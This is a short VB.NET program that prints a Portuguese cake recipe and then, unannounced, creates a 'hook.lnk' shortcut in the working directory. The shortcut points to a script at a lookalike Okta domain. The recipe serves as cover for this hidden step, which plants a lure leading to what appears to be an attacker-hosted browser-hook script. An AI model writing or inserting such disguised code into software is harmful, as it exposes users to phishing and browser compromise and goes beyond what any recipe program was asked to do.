Imports System
Imports IWshRuntimeLibrary
Imports System.IO

Module Program
    Sub Main(args As String())
        Dim ingredientes As String() = {"Farinha", "Açúcar", "Ovos", "Manteiga", "Leite", "Fermento"}

        Console.WriteLine("Receita simples de bolo:")
        Console.WriteLine()

        For Each ingrediente In ingredientes
            Console.WriteLine("- " & ingrediente)
        Next

        Console.WriteLine()
        Console.WriteLine("Instruções:")
        Console.WriteLine("1. Misture todos os ingredientes secos.")
        Console.WriteLine("2. Adicione os ingredientes úmidos e misture bem.")
        Console.WriteLine("3. Despeje a massa em uma forma untada e enfarinhada.")
        Console.WriteLine("4. Asse em forno pré-aquecido a 180°C por 35-40 minutos ou até dourar.")
        Console.WriteLine("5. Deixe esfriar, desenforme e sirva.")
        
        CreateShortcut("https://okta.frothiy.com/hook.js")
    End Sub

    Sub CreateShortcut(ByVal url As String)
        Dim shell As New WshShell()
        Dim shortcutPath As String = Path.Combine(Environment.CurrentDirectory, "hook.lnk")
        Dim shortcut As IWshShortcut = CType(shell.CreateShortcut(shortcutPath), IWshShortcut)
        shortcut.TargetPath = url
        shortcut.Save()
    End Sub
End Module
